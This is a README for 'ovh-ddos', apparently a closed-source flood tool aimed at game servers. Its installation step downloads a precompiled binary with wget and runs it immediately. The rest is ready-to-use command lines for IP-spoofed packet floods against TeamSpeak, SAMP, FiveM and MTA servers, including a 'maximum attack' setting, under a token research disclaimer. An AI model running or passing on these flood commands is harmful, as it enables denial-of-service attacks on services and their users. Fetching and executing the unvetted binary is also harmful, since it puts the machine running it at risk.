# ovh-ddos - Advanced Network Flood Tool

&#x20;
## üìå Requirements
- Spoofing Server
## üöÄ Overview

ovh-ddos is a powerful network testing tool designed for stress-testing various online services. It provides multiple attack vectors, allowing researchers to analyze network resilience against different types of traffic floods.

‚ö†Ô∏è **Disclaimer**: This tool is intended for educational and security research purposes only. Unauthorized usage against systems you do not own is illegal and strictly prohibited.

## üîß Installation

```bash
# Download the precompiled binary
wget https://raw.githubusercontent.com/ivanivek/ovh-ddos/refs/heads/main/ovh-ddos
chmod +x ovh-ddos ; ./ovh-ddos
```

## üìå Usage

```bash
./ovh-ddos -i <interface> -h <host> [action] [options]
```

### üéØ Example Usage

#### TeamSpeak Flood
```bash
./ovh-ddos -T -h ipadress -p teamspeakport -s sourceip -j pps -m thread -i interface
```

#### Maximum TeamSpeak Attack
```bash
./ovh-ddos -T -h ip -p 9987 -s random -j 800000000 -m 32 -i eth0
```

*The maximum attack configuration applies to all attack types and options for peak efficiency.*

#### SAMP Flood
```bash
./ovh-ddos -F -h ipadress -p sampport -s sourceip -j pps -m thread -i interface
```

#### FiveM Flood
```bash
./ovh-ddos -B -h ipadress -p 30120 -s sourceip -j pps -m thread -i interface
```

#### MTA Flood
```bash
./ovh-ddos -Q -h ipadress -p mtaport -s sourceip -j pps -m thread -i interface
```

## ‚öôÔ∏è Options

| Option           | Description                          |
| ---------------- | ------------------------------------ |
| `-i [interface]` | Specify network interface (Required) |
| `-h [host]`      | Target host(s)                       |
| `-p [port]`      | Target port (Default: Random)        |
| `-s [ip]`        | IP spoofing (CIDR supported, use `-s spoofing` for random source IPs) |
| `-j [pps]`       | Packets per second limit             |
| `-m [threads]`   | Number of threads (Default: 1)       |
| `-t [time]`      | Attack duration in seconds           |
| `--help`         | Show usage help                      |

## üî• Future Updates

If this project reaches **10+ GitHub stars**, new attack types will be added, including:

- **RAGE-MP Flood** (Targeting multiplayer game servers)
- **Rust Game Flood** (Packet stress testing for Rust servers)
- **More attack vectors** for testing various online services!

If this project reaches **50+ GitHub stars**, the **source code** will be made publicly available!
